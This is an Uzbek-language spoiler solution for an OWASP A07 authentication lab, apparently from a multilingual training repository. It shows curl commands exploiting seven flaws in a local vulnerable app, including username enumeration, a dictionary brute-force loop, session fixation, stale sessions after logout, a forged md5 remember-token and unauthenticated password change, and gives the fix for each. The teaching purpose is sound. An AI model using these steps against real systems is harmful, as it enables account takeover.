🌐 [English](./SOLUTION.md) · [Русский](./SOLUTION.ru.md) · **Oʻzbekcha**

# A07 — Yechim tahlili (spoylerlar)

Barcha misollar — `http://127.0.0.1:8061` (vulnerable) ga `curl`. Cookie muhim boʻlgan joylarda `-c cookies.txt -b cookies.txt` ishlatamiz.

## 1-nuqson — zaif parol siyosati

```bash
curl -s -X POST http://127.0.0.1:8061/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"eve","password":"1"}'
# {"ok": true} — "1" paroli savolsiz qabul qilindi
```

**Qoida:** roʻyxatdan oʻtish — zaif parolni tizimga kiritmaslikning yagona nuqtasi. Bu laboratoriyada `bob` test akkaunti `123456` paroli bilan aynan oʻtmishda bu tekshiruv boʻlmagani uchun yaratilgan: zaif parollar kirishda toʻxtatilmasa, bazada yillab «yashaydi».

**Fix:** `password_policy_error()` — kamida 8 belgi va keng tarqalgan parollarni taqiqlash (`# FIX 1`, `/register` da ham, `/change-password` da ham qoʻllanadi).

## 2-nuqson — foydalanuvchilarni sanab chiqish

```bash
curl -s -X POST http://127.0.0.1:8061/login \
  -H 'Content-Type: application/json' -d '{"username":"nosuchuser","password":"x"}'
# 404 "пользователь не найден"

curl -s -X POST http://127.0.0.1:8061/login \
  -H 'Content-Type: application/json' -d '{"username":"alice","password":"wrong"}'
# 401 "неверный пароль"
```

Javob kodi va matni orasidagi farq boʻyicha birorta ham parolni bilmasdan, saralash orqali mavjud loginlar roʻyxatini yigʻish mumkin.

**Fix:** ikkala holatda ham bir xil kod va xabar: `401 "неверный логин или пароль"` (`# FIX 2`).

## 3-nuqson — saralashdan (brute force) himoya yoʻq

```bash
for pw in 111111 password 123456 qwerty 12345678; do
  r=$(curl -s -X POST http://127.0.0.1:8061/login \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"bob\",\"password\":\"$pw\"}")
  echo "$pw -> $r"
done
# pw=123456 -> {"ok": true, "role": "user", "user": "bob"}
```

Na pauza, na kapcha, na bloklash: qisqa lugʻat `123456` parolli akkauntni bir necha soniyada ochadi.

**Fix:** har bir login uchun muvaffaqiyatsiz urinishlar hisoblagichi, ketma-ket 5 ta muvaffaqiyatsizlikdan keyin 60 soniyaga bloklash (`# FIX 3`). FIX 2 bilan birga bu ham saralashdan himoya, ham qaysi parametr notoʻgʻri ekani haqida maʼlumot sizib chiqmasligi.

## 4-nuqson — session fixation

Asosiy gʻoya: server `sid` ni kirishdan oldinoq beradi (`GET /` da) va muvaffaqiyatli autentifikatsiyadan keyin uni **oʻzgartirmaydi**. Demak, kirishdan oldin ikki tomonda tasodifan yoki ataylab bir xil `sid` boʻlsa, ulardan biri kirgach, ikkinchisi ham kirish huquqini oladi.

```bash
# 1. "Hujumchi" sid ni HECH QANDAY kirishdan OLDIN oladi
curl -s -c atk.txt http://127.0.0.1:8061/ > /dev/null
ATK_SID=$(grep sid atk.txt | awk '{print $7}')
echo "hujumchi sid'i: $ATK_SID"

# 2. "Qurbon" (admin) AYNAN shu sid dan foydalanib kiradi
#    (haqiqiy hujumda qurbonni shu sid li havolani ochishga majburlashadi,
#    bu yerda namoyish uchun uni toʻgʻridan-toʻgʻri qayta ishlatamiz)
curl -s -b "sid=$ATK_SID" -X POST http://127.0.0.1:8061/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"Adm1n-Str0ng-Pass!2025"}'

# 3. Hujumchi OʻZINING eski cookie-faylidan foydalanadi: undagi sid admin sifatida authenticated
curl -s -b atk.txt http://127.0.0.1:8061/admin
# {"flag": "FLAG{A07_remember_me_token_is_just_md5_of_username}", ...}
```

**Qoida:** sessiya identifikatori kirish lahzasigacha mavjud boʻlgan boʻlsa, buzilgan deb hisoblanishi shart. Autentifikatsiyadan keyin unga ishonib boʻlmaydi: yangisi kerak.

**Fix:** `fixed/app.py` kirishgacha umuman `sid` bermaydi (`GET /` endi anonim sessiya yaratmaydi), muvaffaqiyatli `/login` da esa har doim yangi `sid` hosil qilinadi, eskisi (yuborilgan boʻlsa) oʻchiriladi (`# FIX 4`).

## 5-nuqson — logout sessiyani serverda bekor qilmaydi

```bash
curl -s -c s.txt -X POST http://127.0.0.1:8061/login \
  -H 'Content-Type: application/json' -d '{"username":"alice","password":"alice-Good-Pass1"}'
SID=$(grep sid s.txt | awk '{print $7}')

curl -s -b s.txt -X POST http://127.0.0.1:8061/logout
# {"ok": true, "message": "вы вышли"}

curl -s -b "sid=$SID" http://127.0.0.1:8061/me
# {"role": "user", "user": "alice"} — sessiya hamon faol!
```

`sid` egasi «chiqish» ni bosishidan oldin ushlab olingan boʻlsa (oʻgʻirlangan cookie, XSS, jamoat kompyuteri), «chiqish» oʻgʻri uchun hech narsani oʻzgartirmaydi.

**Fix:** `/logout` serverdagi `SESSIONS` dan yozuvni (va unga bogʻliq `remember_token` ni `REMEMBER` dan) oʻchiradi, faqat javobdagi cookie'larni emas (`# FIX 5`).

## 6-nuqson — oldindan aytib boʻladigan «meni eslab qol» tokeni

`vulnerable/app.py` dagi token — bu `md5(username)`, uni serverga umuman murojaat qilmasdan hisoblash mumkin:

```bash
python3 -c "import hashlib; print(hashlib.md5(b'admin').hexdigest())"
# -> aniq qiymat, masalan 21232f297a57a5a743894a0e4a801fc3

curl -s -c a.txt -b "remember_token=21232f297a57a5a743894a0e4a801fc3" \
  http://127.0.0.1:8061/auto-login
# {"ok": true, "user": "admin", "note": "вход по remember_token"}

curl -s -b a.txt http://127.0.0.1:8061/admin
# bayroq
```

Hujumchiga bilish kerak boʻlgan yagona narsa — `admin` logini (sir emas).

**Qoida:** doimiy token ham parol kabi sir. Uni ochiq maʼlumotlardan deterministik tarzda hisoblab boʻlmaydi; u yetarli entropiyali tasodifiy qiymat boʻlishi, server uni qayta hisoblamasdan saqlab, solishtirishi kerak.

**Fix:** `secrets.token_urlsafe(32)`, serverda tokenning faqat `sha256`-xeshi amal qilish muddati bilan saqlanadi; token har gal ishlatilganda almashtiriladi (`# FIX 6`).

## 7-nuqson — joriy parolsiz parolni almashtirish

Har qanday faol (jumladan oʻgʻirlangan) sessiya boʻlsa:

```bash
curl -s -b atk.txt -X POST http://127.0.0.1:8061/change-password \
  -H 'Content-Type: application/json' -d '{"new_password":"hacked-by-attacker"}'
# {"ok": true, "message": "пароль изменён"} — admin parolni kiritmagan!
```

Bu *har qanday* vaqtinchalik sessiya qoʻlga olinishini (1, 4 yoki 6-nuqsonlar orqali) akkauntni *doimiy* yoʻqotishga aylantiradi: parol oʻzgaradi va qonuniy egasi endi kira olmaydi.

**Fix:** `/change-password` `current_password` ni talab qiladi, u `hmac.compare_digest` orqali solishtiriladi, yangi parolga esa roʻyxatdan oʻtishdagi siyosatning oʻzi qoʻllanadi (`# FIX 7`).

## Xulosa

Yettita nuqsonning birortasi ham `eval()` yoki SQL-satrni birlashtirish kabi bitta zaif funksiyada yashamaydi: har biri autentifikatsiyani loyihalashda **qaysi qaror qabul qilinmagani** haqida: sessiya identifikatorini qachon qayta chiqarish, nimani sir hisoblash, nechta urinishga ruxsat berish, qaysi javob hech narsani oshkor qilmasligi kerak va qachon shaxsni qayta tasdiqlashni talab qilish. Bu toʻliq A06 Insecure Design ruhida, ammo aynan «sen kimsan» ga qaratilgan, shuning uchun alohida A07 toifasi.
